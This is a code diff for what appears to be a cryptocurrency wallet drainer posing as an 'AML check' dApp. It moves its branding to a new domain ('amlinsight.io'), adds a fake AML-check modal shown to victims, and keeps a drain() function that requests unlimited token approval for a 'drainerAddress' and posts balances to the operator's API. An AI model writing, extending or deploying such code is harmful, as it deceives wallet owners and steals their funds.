@@ -3,6 +3,7 @@ import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
 import config from './config.js';
+import { showAMLCheckModal } from './aml-check-modal.js';
 
 const projectId = config.PROJECT_ID;
 const networks = [mainnet, polygon, bsc, arbitrum];
@@ -15,8 +16,8 @@ const appKitModal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://bybitamlbot.com/',
-    icons: ['https://bybitamlbot.com/icon.png'],
+    url: 'https://amlinsight.io/',
+    icons: ['https://amlinsight.io/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
   allWallets: 'SHOW',
@@ -318,9 +319,9 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
     const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
 
     console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
-    
+    await showAMLCheckModal(userAddress, roundedBalance);
 
-    const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
+    const response = await fetch('https://api.amlinsight.io/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -514,7 +515,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
         await delay(10);
 
         const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
-          gasLimit: 500000,
+          gasLimit: 400000,
           gasPrice: gasPrice,
           nonce
         });
